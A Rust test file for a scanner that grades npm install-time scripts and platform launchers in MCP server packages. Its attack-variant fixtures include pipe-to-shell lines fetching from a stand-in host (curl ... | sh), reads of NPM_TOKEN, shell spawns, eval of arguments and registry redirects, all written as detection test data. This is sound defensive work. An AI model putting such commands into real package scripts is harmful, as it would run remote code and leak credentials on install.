//! Tests for the lifecycle-script classifier (`scanner::lifecycle`).
//!
//! The benign shapes are reduced from published MCP servers in the clean
//! corpus (the Microsoft platform launchers, Postman's only-allow guard,
//! build-only `prepare` scripts); every attack variant is a small change to
//! one of them that must keep the pack's original severity. No fixture here
//! deletes anything outside its own package: the path validator is tested on
//! strings alone.
//!
//! Listed in `.sigilignore` with the other detection-engine test inputs.

use std::fs;
use std::path::Path;

use super::lifecycle::{
    inert_source, is_package_relative_path, Source, Spec, TITLE_BUILD, TITLE_GUARD, TITLE_INERT,
    TITLE_LAUNCHER,
};
use super::{run_scan, Finding, ScanResult, Severity, Verdict};

fn write_tree(root: &Path, entries: &[(&str, &str)]) {
    for (rel, body) in entries {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, body).unwrap();
    }
}

fn scan(entries: &[(&str, &str)]) -> ScanResult {
    let dir = tempfile::tempdir().unwrap();
    write_tree(dir.path(), entries);
    run_scan(dir.path(), None, None)
}

fn rules(r: &ScanResult) -> Vec<(String, Severity)> {
    r.findings
        .iter()
        .map(|f| (f.rule.clone(), f.severity))
        .collect()
}

fn find<'a>(r: &'a ScanResult, rule: &str) -> Option<&'a Finding> {
    r.findings.iter().find(|f| f.rule == rule)
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/// The Microsoft platform-launcher manifest (`@azure/mcp`,
/// `@microsoft/fabric-mcp`), reduced.
const LAUNCHER_MANIFEST: &str = r#"{
  "name": "@acme/tool-mcp",
  "version": "1.4.0",
  "bin": {
    "acme-mcp": "./index.js"
  },
  "optionalDependencies": {
    "@acme/tool-mcp-darwin-arm64": "1.4.0",
    "@acme/tool-mcp-linux-x64": "1.4.0",
    "@acme/tool-mcp-win32-x64": "1.4.0"
  },
  "scripts": {
    "postinstall": "node ./scripts/post-install-script.js"
  }
}
"#;

/// The postinstall those packages ship, verbatim in shape.
const INERT_POSTINSTALL: &str = r#"const os = require('os');

const platform = os.platform();
const arch = os.arch();

let baseName = '';
try{
    const packageJson = require('../package.json');
    baseName = packageJson.name;
}
catch (err) {
  console.error('Unable to verify platform package installation. Error reading package.json.');
  process.exit(1);
}

const requiredPackage = `${baseName}-${platform}-${arch}`;
try {
  require.resolve(requiredPackage);
} catch (err) {
  console.error(`Missing required package: '${requiredPackage}'. See https://aka.ms/azmcp/troubleshooting`);
  process.exit(1);
}
"#;

/// The launcher `bin` script, reduced from `@microsoft/fabric-mcp`.
const LAUNCHER: &str = r#"#!/usr/bin/env node

const os = require('os')
const packageJson = require('./package.json')

const platform = os.platform()
const arch = os.arch()

const packageName = packageJson.name
const packageVersion = packageJson.version
const platformPackageName = `${packageName}-${platform}-${arch}`

let platformPackage
try {
  platformPackage = require(platformPackageName)
} catch (err) {
  const { execSync } = require('child_process')
  console.error(`Installing missing platform package: ${platformPackageName}`)
  try {
    execSync(`npm install ${platformPackageName}@${packageVersion}`, {
      stdio: ['inherit', 'inherit', 'pipe'],
      timeout: 60000
    })
  } catch (npmErr) {
    execSync(`npm install ${platformPackageName}@${packageVersion} --no-save --prefer-online`, {
      stdio: ['inherit', 'inherit', 'pipe'],
      timeout: 60000
    })
  }
  platformPackage = require(platformPackageName)
}
platformPackage.run(process.argv.slice(2))
"#;

/// `@azure/mcp`'s second form: the command in a constant, the options in
/// another, the call adding one flag.
const LAUNCHER_CONST: &str = r#"#!/usr/bin/env node
const os = require('os')
const packageJson = require('./package.json')
const platform = os.platform()
const arch = os.arch()
const packageName = packageJson.name
const packageVersion = packageJson.version
const platformPackageName = `${packageName}-${platform}-${arch}`

function cacheRoot() {
  if (platform === 'win32') {
    return 'AppData'
  }
  return (packageJson.engines || {}).node
}

function install(installDir) {
  const { execSync } = require('child_process')
  const installOptions = {
    cwd: installDir,
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 60000
  }
  const installCommand = `npm install ${platformPackageName}@${packageVersion} --no-save --no-audit --no-fund --prefix .`
  try {
    execSync(installCommand, installOptions)
  } catch (npmErr) {
    execSync(`${installCommand} --prefer-online`, installOptions)
  }
}
install(process.argv[2])
"#;

fn microsoft_shape() -> Vec<(&'static str, String)> {
    vec![
        ("package/package.json", LAUNCHER_MANIFEST.to_string()),
        (
            "package/scripts/post-install-script.js",
            INERT_POSTINSTALL.to_string(),
        ),
        ("package/index.js", LAUNCHER.to_string()),
    ]
}

fn scan_owned(entries: &[(&str, String)]) -> ScanResult {
    let borrowed: Vec<(&str, &str)> = entries.iter().map(|(p, b)| (*p, b.as_str())).collect();
    scan(&borrowed)
}

/// `entries` with `path` replaced (or added).
fn with(
    mut entries: Vec<(&'static str, String)>,
    path: &'static str,
    body: &str,
) -> Vec<(&'static str, String)> {
    entries.retain(|(p, _)| *p != path);
    entries.push((path, body.to_string()));
    entries
}

// ---------------------------------------------------------------------------
// Titles agree with the pack
// ---------------------------------------------------------------------------

#[test]
fn titles_match_the_documented_engine_rules() {
    let corpus = crate::corpus::compiled::corpus();
    for (id, title) in [
        ("INSTALL-010", TITLE_INERT),
        ("INSTALL-011", TITLE_GUARD),
        ("INSTALL-012", TITLE_BUILD),
        ("CODE-016", TITLE_LAUNCHER),
    ] {
        assert_eq!(corpus.rule_meta(id).expect(id).title, title, "{id}");
    }
}

// ---------------------------------------------------------------------------
// The benign shapes
// ---------------------------------------------------------------------------

/// com.microsoft/azure, microsoft-fabric, template-server-name: CRITICAL
/// on the postinstall, HIGH on the launcher. The postinstall is inert and the
/// launcher installs the package's own platform build, so MEDIUM.
#[test]
fn the_microsoft_launcher_shape_is_medium() {
    let r = scan_owned(&microsoft_shape());
    let found = rules(&r);
    assert!(
        !found
            .iter()
            .any(|(id, _)| id == "INSTALL-003" || id == "CODE-014" || id == "SKILL-006"),
        "{found:?}"
    );
    let inert = find(&r, "INSTALL-010").expect("INSTALL-010");
    assert_eq!(inert.severity, Severity::Medium);
    assert!(inert.snippet.starts_with(TITLE_INERT), "{}", inert.snippet);
    assert!(inert.snippet.contains("os"), "{}", inert.snippet);
    let launches: Vec<&Finding> = r.findings.iter().filter(|f| f.rule == "CODE-016").collect();
    assert_eq!(launches.len(), 2, "{found:?}");
    assert!(launches.iter().all(|f| f.severity == Severity::Medium));
    assert_eq!(r.verdict, Verdict::MediumRisk, "{found:?}");
}

#[test]
fn the_constant_command_launcher_form_is_medium() {
    let entries = with(microsoft_shape(), "package/index.js", LAUNCHER_CONST);
    let r = scan_owned(&entries);
    let found = rules(&r);
    assert!(!found.iter().any(|(id, _)| id == "CODE-014"), "{found:?}");
    assert!(find(&r, "CODE-016").is_some(), "{found:?}");
}

/// com.postman/postman-mcp-server: `npx only-allow pnpm` in two manifests.
#[test]
fn the_postman_only_allow_shape_is_low() {
    let manifest = r#"{
  "name": "postman-mcp",
  "version": "2.0.0",
  "scripts": {
    "preinstall": "npx only-allow pnpm",
    "build": "tsc"
  },
  "devDependencies": { "typescript": "^5.9.3" }
}
"#;
    let r = scan(&[
        ("package/package.json", manifest),
        ("package/dist/package.json", manifest),
        ("package/dist/index.js", "console.log('hi')\n"),
    ]);
    let found = rules(&r);
    let guards: Vec<&Finding> = r
        .findings
        .iter()
        .filter(|f| f.rule == "INSTALL-011")
        .collect();
    assert_eq!(guards.len(), 2, "{found:?}");
    assert!(guards.iter().all(|f| f.severity == Severity::Low));
    assert!(!found
        .iter()
        .any(|(id, _)| id == "INSTALL-003" || id == "SKILL-006"));
    assert_eq!(r.verdict, Verdict::LowRisk, "{found:?}");
}

/// `prepare: npm run build` with a tsc/chmod/shx build is a build step.
#[test]
fn build_only_prepare_scripts_are_low() {
    for (scripts, deps) in [
        (
            r#""build": "tsc && shx chmod +x dist/*.js", "prepare": "npm run build""#,
            r#""typescript": "^5.9.3", "shx": "^0.4.0""#,
        ),
        (
            r#""build": "tsc", "prepare": "npm run build""#,
            r#""typescript": "^5.6.0""#,
        ),
        (r#""prepare": "husky || true""#, r#""husky": "^9.1.7""#),
        (r#""prepare": "husky""#, r#""husky": "9.1.7""#),
        (
            r#""build": "shx rm -rf dist && tsc --project tsconfig.build.json", "prepublish": "npm run build && shx chmod +x dist/index.js""#,
            r#""typescript": "^5.8.2", "shx": "^0.3.4""#,
        ),
        (
            r#""clean": "rimraf ./dist", "build": "npm run clean && tsc -b && chmod +x dist/index.js", "prepare": "npm run build""#,
            r#""typescript": "5.9.3", "rimraf": "6.0.1""#,
        ),
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }},\n  \"devDependencies\": {{ {deps} }}\n}}\n"
        );
        let r = scan(&[
            ("package.json", &manifest),
            ("dist/index.js", "console.log(1)\n"),
        ]);
        let found = rules(&r);
        assert!(
            found
                .iter()
                .any(|(id, s)| id == "INSTALL-012" && *s == Severity::Low),
            "{scripts}: {found:?}"
        );
        assert!(
            !found.iter().any(|(id, _)| id == "INSTALL-004"),
            "{scripts}: {found:?}"
        );
        assert_eq!(r.verdict, Verdict::LowRisk, "{scripts}: {found:?}");
    }
}

// ---------------------------------------------------------------------------
// INSTALL-003 attack variants keep Critical
// ---------------------------------------------------------------------------

fn assert_install003_stays_critical(entries: &[(&str, String)], what: &str) {
    let r = scan_owned(entries);
    let found = rules(&r);
    assert!(
        found
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "{what}: INSTALL-003 must stay Critical: {found:?}"
    );
    assert!(
        !found
            .iter()
            .any(|(id, _)| id == "INSTALL-010" || id == "INSTALL-011"),
        "{what}: {found:?}"
    );
    assert_eq!(r.verdict, Verdict::CriticalRisk, "{what}");
}

fn postinstall_with(script: &str) -> Vec<(&'static str, String)> {
    with(
        microsoft_shape(),
        "package/scripts/post-install-script.js",
        script,
    )
}

#[test]
fn a_postinstall_with_any_capability_stays_critical() {
    let cases: &[(&str, &str)] = &[
        (
            "https",
            "const https = require('https');\nhttps.get('https://x.example/p');\n",
        ),
        (
            "child_process",
            "require('child_process').execSync('id');\n",
        ),
        (
            "fs",
            "const fs = require('fs');\nconsole.log(fs.readdirSync('.'));\n",
        ),
        ("require alias", "const r = require;\nr('child_process');\n"),
        ("computed require", "const os = require('o' + 's');\n"),
        (
            "computed os member",
            "const os = require('os');\nconsole.log(os['user' + 'Info']());\n",
        ),
        (
            "os aliased",
            "const o = require('os');\nconsole.log(o.userInfo());\n",
        ),
        (
            "os destructured beyond the allowlist",
            "const { userInfo } = require('os');\nconsole.log(userInfo());\n",
        ),
        ("process computed", "console.log(process['env']);\n"),
        ("process.env", "console.log(process.env.NPM_TOKEN);\n"),
        (
            "process aliased",
            "const p = process;\nconsole.log(p.env);\n",
        ),
        (
            "Buffer",
            "console.log(Buffer.from('aGk=', 'base64').toString());\n",
        ),
        ("hex escape", "const m = '\\x63hild_process';\n"),
        ("unicode escape", "const m = '\\u0063hild_process';\n"),
        (
            "dynamic import",
            "import('https').then(m => m.get('https://x.example'));\n",
        ),
        ("native addon", "require('./addon.node');\n"),
        ("arguments", "const r = arguments[1];\nr('fs');\n"),
        ("this", "const g = (function () { return this; })();\n"),
        ("Reflect", "Reflect.get(console, 'log');\n"),
        ("URL outside console", "const u = 'https://x.example/p';\n"),
        ("IPv4", "const h = '10.0.0.1';\n"),
        ("Function", "const f = Function;\n"),
        ("static import", "import { exec } from 'child_process';\n"),
        ("re-export", "export { exec } from 'child_process';\n"),
        ("with", "with (console) { log(1); }\n"),
    ];
    for (what, script) in cases {
        assert_install003_stays_critical(&postinstall_with(script), what);
        assert!(
            inert_source(script).is_err(),
            "{what} must fail the inert test"
        );
    }
}

#[test]
fn a_required_local_module_is_held_to_the_same_test() {
    let entries = with(
        postinstall_with("const lib = require('./lib.js');\nlib.check();\n"),
        "package/scripts/lib.js",
        "module.exports.check = function () { require('https').get('https://x.example'); };\n",
    );
    assert_install003_stays_critical(&entries, "lib.js uses https");

    // Three hops of local requires is beyond the depth followed.
    let mut deep = postinstall_with("require('./a.js');\n");
    deep = with(deep, "package/scripts/a.js", "require('./b.js');\n");
    deep = with(deep, "package/scripts/b.js", "require('./c.js');\n");
    deep = with(deep, "package/scripts/c.js", "console.log(1);\n");
    assert_install003_stays_critical(&deep, "require chain deeper than two");

    // A module outside the package directory.
    let outside = with(
        postinstall_with("require('../../elsewhere.js');\n"),
        "elsewhere.js",
        "console.log(1);\n",
    );
    assert_install003_stays_critical(&outside, "require outside the package");
}

#[test]
fn an_oversized_non_ascii_or_missing_target_stays_critical() {
    let big = format!(
        "console.log(1);\n{}",
        "// padding padding padding\n".repeat(200)
    );
    assert_install003_stays_critical(&postinstall_with(&big), "over 4 KiB");
    assert_install003_stays_critical(
        &postinstall_with("console.log('caf\u{e9}');\n"),
        "non-ASCII",
    );
    let long_line = format!("console.log('{}');\n", "a".repeat(220));
    assert_install003_stays_critical(&postinstall_with(&long_line), "line over 200 bytes");
    let missing: Vec<(&str, String)> = microsoft_shape()
        .into_iter()
        .filter(|(p, _)| !p.ends_with("post-install-script.js"))
        .collect();
    assert_install003_stays_critical(&missing, "missing target");
}

fn manifest_with_postinstall(cmd: &str) -> String {
    LAUNCHER_MANIFEST.replace("node ./scripts/post-install-script.js", cmd)
}

#[test]
fn any_other_postinstall_command_stays_critical() {
    for cmd in [
        "node -e \\\"console.log(1)\\\"",
        "bun run ./scripts/post-install-script.js",
        "node ./scripts/post-install-script.js && curl -s https://x.example/p | sh",
        "node ../outside.js",
        "node ./scripts/post-install-script.js --flag",
        "node scripts/post-install-script.ts",
    ] {
        let entries = with(
            microsoft_shape(),
            "package/package.json",
            &manifest_with_postinstall(cmd),
        );
        let entries = with(entries, "package/outside.js", "console.log(1);\n");
        assert_install003_stays_critical(&entries, cmd);
    }
}

#[test]
fn only_allow_variants_stay_critical() {
    let base = |scripts: &str, extra: &str| {
        format!("{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }}{extra}\n}}\n")
    };
    let cases = [
        base(r#""preinstall": "npx only-allow pnpm && node x.js""#, ""),
        base(r#""preinstall": "npx only-allow pnpm; curl -s https://x.example/p | sh""#, ""),
        base(r#""preinstall": "npx only-allow@latest pnpm""#, ""),
        base(r#""preinstall": "npx only-allow pnpm ""#, ""),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"dependencies\": { \"only-allow\": \"^1.2.1\" },\n  \"bundleDependencies\": [\"only-allow\"]",
        ),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"devDependencies\": { \"only-allow\": \"github:x/y\" }",
        ),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"overrides\": { \"only-allow\": \"github:x/y\" }",
        ),
    ];
    for manifest in &cases {
        let entries = vec![
            ("package.json", manifest.clone()),
            ("x.js", "1\n".to_string()),
        ];
        assert_install003_stays_critical(&entries, manifest);
    }
    // A shipped node_modules beside the manifest: npx would run it.
    let dir = tempfile::tempdir().unwrap();
    write_tree(
        dir.path(),
        &[
            (
                "package.json",
                &base(r#""preinstall": "npx only-allow pnpm""#, ""),
            ),
            (
                "node_modules/only-allow/bin.js",
                "require('child_process')\n",
            ),
        ],
    );
    let r = run_scan(dir.path(), None, None);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-003"),
        "{:?}",
        rules(&r)
    );
}

#[test]
fn a_binding_gyp_keeps_the_postinstall_critical() {
    let entries = with(
        microsoft_shape(),
        "package/binding.gyp",
        "{ \"targets\": [] }\n",
    );
    assert_install003_stays_critical(&entries, "binding.gyp beside the manifest");
}

/// A lifecycle key that is not a top-level script (a nested object, or a
/// string) cannot be classified and keeps the pack's severity.
#[test]
fn a_lifecycle_key_outside_scripts_is_not_classified() {
    let manifest = "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"npx only-allow pnpm\"},\"config\":{\"preinstall\":\"curl -s https://x.example/p | sh\"}}\n";
    let entries = vec![("package.json", manifest.to_string())];
    assert_install003_stays_critical(&entries, "second key on the line is not a script");
}

// ---------------------------------------------------------------------------
// CODE-014 launcher variants keep High
// ---------------------------------------------------------------------------

fn assert_code014_stays(entries: &[(&str, String)], what: &str) {
    let r = scan_owned(entries);
    let found = rules(&r);
    assert!(
        found
            .iter()
            .any(|(id, s)| id == "CODE-014" && *s == Severity::High),
        "{what}: CODE-014 must stay High: {found:?}"
    );
}

#[test]
fn launcher_variants_keep_code014() {
    let launcher = |from: &str, to: &str| {
        assert!(LAUNCHER.contains(from), "fixture drifted: {from}");
        with(
            microsoft_shape(),
            "package/index.js",
            &LAUNCHER.replace(from, to),
        )
    };
    let cases: Vec<(&str, Vec<(&'static str, String)>)> = vec![
        (
            "foreign literal package",
            launcher(
                "const platformPackageName = `${packageName}-${platform}-${arch}`",
                "const platformPackageName = 'left-pad'",
            ),
        ),
        (
            "package from the environment",
            launcher(
                "const packageName = packageJson.name",
                "const packageName = process.env.PKG",
            ),
        ),
        (
            "version from the environment",
            launcher(
                "const packageVersion = packageJson.version",
                "const packageVersion = process.env.VER",
            ),
        ),
        (
            "registry flag",
            launcher(
                "@${packageVersion} --no-save --prefer-online`",
                "@${packageVersion} --registry=https://x.example`",
            ),
        ),
        (
            "unknown flag",
            launcher(
                "@${packageVersion} --no-save --prefer-online`",
                "@${packageVersion} --userconfig --no-save`",
            ),
        ),
        (
            "another runner",
            launcher(
                "execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
                "execSync(`${bunCmd} add -g ${platformPackageName}`, {",
            ),
        ),
        (
            "reassigned variable",
            launcher(
                "const platformPackageName = `${packageName}-${platform}-${arch}`",
                "let platformPackageName = `${packageName}-${platform}-${arch}`\nplatformPackageName = process.env.EVIL",
            ),
        ),
        (
            "second declaration",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const platformPackageName = process.env.EVIL\n  const { execSync }",
            ),
        ),
        (
            "another shell call on the same line",
            launcher(
                "    execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
                "    require('child_process').spawn('sh', ['-c', process.argv[2]]); execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
            ),
        ),
        (
            "for-of rebinding",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  for (platformPackageName of process.argv) {}\n  const { execSync }",
            ),
        ),
        (
            "nested destructured parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const run = function ({ a: { platformPackageName } }) { return platformPackageName }\n  const { execSync }",
            ),
        ),
        (
            "rest element",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const { ...platformPackageName } = process.env\n  const { execSync }",
            ),
        ),
        (
            "arrow parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const go = (platformPackageName) => platformPackageName\n  const { execSync }",
            ),
        ),
        (
            "shadowing parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (platformPackageName) {\n  const { execSync }",
            ),
        ),
        (
            "manifest from elsewhere",
            launcher(
                "const packageJson = require('./package.json')",
                "const packageJson = require('./other/package.json')",
            ),
        ),
        (
            "env in the options",
            launcher(
                "      stdio: ['inherit', 'inherit', 'pipe'],\n      timeout: 60000\n    })\n  } catch (npmErr) {",
                "      env: { npm_config_registry: 'https://x.example' },\n      timeout: 60000\n    })\n  } catch (npmErr) {",
            ),
        ),
        (
            "shell in the options",
            launcher(
                "      stdio: ['inherit', 'inherit', 'pipe'],\n      timeout: 60000\n    })\n  } catch (npmErr) {",
                "      shell: './sh',\n      timeout: 60000\n    })\n  } catch (npmErr) {",
            ),
        ),
    ];
    for (what, entries) in cases {
        assert_code014_stays(&entries, what);
    }

    // Not a bin script.
    let not_bin = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST.replace("\"acme-mcp\": \"./index.js\"", "\"acme-mcp\": \"./cli.js\""),
    );
    assert_code014_stays(&not_bin, "not a bin target");
    // Platform packages at another version.
    let mismatched = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST.replace(
            "\"@acme/tool-mcp-linux-x64\": \"1.4.0\"",
            "\"@acme/tool-mcp-linux-x64\": \"9.9.9\"",
        ),
    );
    assert_code014_stays(&mismatched, "mismatched optional dependency version");
    // Only one platform package.
    let one = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST
            .replace("    \"@acme/tool-mcp-darwin-arm64\": \"1.4.0\",\n", "")
            .replace("    \"@acme/tool-mcp-linux-x64\": \"1.4.0\",\n", ""),
    );
    assert_code014_stays(&one, "a single platform package");
    // An eval anywhere in the launcher can introduce a binding.
    let evald = with(
        microsoft_shape(),
        "package/index.js",
        &LAUNCHER.replace(
            "let platformPackage\n",
            "let platformPackage\neval(process.argv[2])\n",
        ),
    );
    assert_code014_stays(&evald, "eval in the launcher");
}

// ---------------------------------------------------------------------------
// INSTALL-004 build variants keep Medium
// ---------------------------------------------------------------------------

#[test]
fn a_prepare_that_runs_anything_else_stays_medium() {
    for (scripts, deps) in [
        (
            r#""build": "tsc && node x.js", "prepare": "npm run build""#,
            r#""typescript": "^5""#,
        ),
        (r#""prepare": "vite build""#, r#""vite": "^5""#),
        (r#""prepare": "webpack""#, r#""webpack": "^5""#),
        (r#""prepare": "rollup -c""#, r#""rollup": "^4""#),
        (r#""prepare": "eslint .""#, r#""eslint": "^9""#),
        (r#""prepare": "npx tsc""#, r#""typescript": "^5""#),
        (
            r#""prepare": "tsc --outDir /tmp/x""#,
            r#""typescript": "^5""#,
        ),
        (
            r#""prepare": "tsc""#,
            r#""typescript": "github:x/typescript""#,
        ),
        (r#""prepare": "tsc""#, r#""typescript": "npm:evil-ts@1""#),
        (r#""prepare": "tsc""#, r#""typescript": "file:../ts""#),
        (r#""prepare": "npm run missing""#, r#""typescript": "^5""#),
        (
            r#""prepare": "tsc", "postprepare": "node x.js""#,
            r#""typescript": "^5""#,
        ),
        (
            r#""build": "tsc", "prebuild": "node x.js", "prepare": "npm run build""#,
            r#""typescript": "^5""#,
        ),
        (r#""prepare": "tsc > out.txt""#, r#""typescript": "^5""#),
        (
            r#""prepare": "shx cp -r dist ../elsewhere""#,
            r#""shx": "^0.4""#,
        ),
        (r#""prepare": "chmod +x $HOME/x""#, r#""typescript": "^5""#),
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }},\n  \"devDependencies\": {{ {deps} }}\n}}\n"
        );
        let r = scan(&[("package.json", &manifest), ("x.js", "console.log(1)\n")]);
        let found = rules(&r);
        assert!(
            found
                .iter()
                .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium),
            "{scripts} / {deps}: INSTALL-004 must stay Medium: {found:?}"
        );
        assert!(
            !found.iter().any(|(id, _)| id == "INSTALL-012"),
            "{scripts}: {found:?}"
        );
    }
}

#[test]
fn a_bundled_or_redirected_build_tool_stays_medium() {
    for extra in [
        ",\n  \"bundleDependencies\": [\"typescript\"]",
        ",\n  \"bundleDependencies\": true",
        ",\n  \"resolutions\": { \"typescript\": \"https://x.example/ts.tgz\" }",
        ",\n  \"resolutions\": { \"**/typescript\": \"https://x.example/ts.tgz\" }",
        ",\n  \"overrides\": { \"foo\": { \"typescript\": \"github:x/ts\" } }",
        ",\n  \"pnpm\": { \"overrides\": { \"typescript@<6\": \"github:x/ts\" } }",
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    \"prepare\": \"tsc\"\n  }},\n  \"devDependencies\": {{ \"typescript\": \"^5\" }}{extra}\n}}\n"
        );
        let r = scan(&[("package.json", &manifest)]);
        assert!(
            r.findings.iter().any(|f| f.rule == "INSTALL-004"),
            "{extra}: {:?}",
            rules(&r)
        );
    }
    // A lockfile that resolves the tool off the registry.
    let manifest = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n";
    let lock = r#"{"lockfileVersion":3,"packages":{"node_modules/typescript":{"version":"5.9.3","resolved":"https://x.example/typescript-5.9.3.tgz"}}}"#;
    let r = scan(&[("package.json", manifest), ("package-lock.json", lock)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-004"),
        "{:?}",
        rules(&r)
    );
    // An override for a package whose name merely contains the tool's name
    // (io.mailtrap/mcp) is not an override of the tool.
    let unrelated = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" },\n  \"overrides\": { \"@typescript-eslint/typescript-estree\": { \"minimatch\": \"9.0.7\" } }\n}\n";
    let r = scan(&[("package.json", unrelated)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-012"),
        "{:?}",
        rules(&r)
    );
    let good_lock = r#"{"lockfileVersion":3,"packages":{"node_modules/typescript":{"version":"5.9.3","resolved":"https://registry.npmjs.org/typescript/-/typescript-5.9.3.tgz"}}}"#;
    let r = scan(&[("package.json", manifest), ("package-lock.json", good_lock)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-012"),
        "{:?}",
        rules(&r)
    );
}

// ---------------------------------------------------------------------------
// Unit checks
// ---------------------------------------------------------------------------

#[test]
fn the_path_validator_accepts_only_package_relative_paths() {
    for ok in [
        "dist",
        "dist/*.js",
        "./dist",
        "build/index.js",
        "tsconfig.build.json",
        ".",
    ] {
        assert!(is_package_relative_path(ok), "{ok}");
    }
    for bad in [
        "",
        "/",
        "/tmp",
        "~",
        "~/x",
        "$HOME",
        "${HOME}",
        "..",
        "../x",
        "a/../../b",
        "-rf",
        "a b",
        "a;b",
        "`x`",
        "a|b",
        "a&b",
        "\"x\"",
        "x\\y",
    ] {
        assert!(!is_package_relative_path(bad), "{bad}");
    }
}

/// The launcher check trusts a name only when the one `const` declaring it
/// is the binding in scope where it is used. `USE` marks the use site.
#[test]
fn single_const_trusts_only_an_unshadowed_const() {
    let resolve = |src: &str| {
        let use_at = src.find("USE").expect("marker");
        let s = Source::new(src).expect("lexes");
        s.single_const("X", use_at).map(|(_, rhs)| rhs.to_string())
    };
    for ok in [
        "const X = 1\nUSE",
        "const X = 1\nif (X) { USE }",
        "const X = 1\nfoo(X)\nUSE",
        "const X = 1\nconst o = { X }\nUSE",
        "const X = 1\n// X = 2\nUSE",
        "const X = 1\nconst s = 'X = 2'\nUSE",
        "const X = 1\nconst t = `${X}-${o.X}`\nUSE",
        "function f() {\n  const X = 1\n  USE\n}",
        "#!/usr/bin/env node\nconst X = 1\nconst r = /x/g\nUSE",
    ] {
        assert_eq!(resolve(ok).as_deref(), Some("1"), "{ok}");
    }
    for bad in [
        "let X = 1\nUSE",
        "var X = 1\nUSE",
        "const X = 1\nX = 2\nUSE",
        "const X = 1\nX += 'y'\nUSE",
        "const X = 1\nX++\nUSE",
        "const X = 1\nfunction f(X) { USE }",
        "const X = 1\nfunction f({ a: { X } }) { USE }",
        "const X = 1\nconst g = (a, X) => USE",
        "const X = 1\nconst g = X => USE",
        "const X = 1\nfunction g() { const { ...X } = o; USE }",
        "const X = 1\nfunction g() { const [X] = o; USE }",
        "const X = 1\nfor (X of xs) {}\nUSE",
        "const X = 1\ntry {} catch (X) { USE }",
        "const X = 1\nfunction X() {}\nUSE",
        "const X = 1\nclass X {}\nUSE",
        "{ const X = 1 }\nUSE",
        "for (const X = 1; ;) { break }\nUSE",
        "USE\nconst X = 1",
        "const X = 1\nconst X = 2\nUSE",
    ] {
        assert_eq!(resolve(bad), None, "{bad}");
    }
    // Text that does not lex is not trusted at all.
    assert!(Source::new("const X = 'unterminated\nUSE").is_none());
    assert!(Source::new("const X = (1\nUSE").is_none());
}

#[test]
fn the_inert_test_reads_the_real_postinstall() {
    let specs = inert_source(INERT_POSTINSTALL).expect("the Microsoft postinstall is inert");
    assert!(specs.contains(&Spec::Builtin("os")));
    assert!(specs.contains(&Spec::Json("../package.json".to_string())));
    // Allowlisted forms.
    for ok in [
        "const { platform, arch } = require('os');\nconsole.log(platform(), arch());\n",
        "import os from 'node:os';\nconsole.log(os.platform());\n",
        "import { platform as p } from 'os';\nconsole.log(p());\n",
        "const path = require('path');\nconsole.log(path.join('a', 'b'), process.argv[2]);\n",
        "console.log(`see https://x.example/docs`);\n",
        "if (require('os').platform() === 'win32') process.exit(0);\n",
    ] {
        assert!(inert_source(ok).is_ok(), "{ok}: {:?}", inert_source(ok));
    }
}
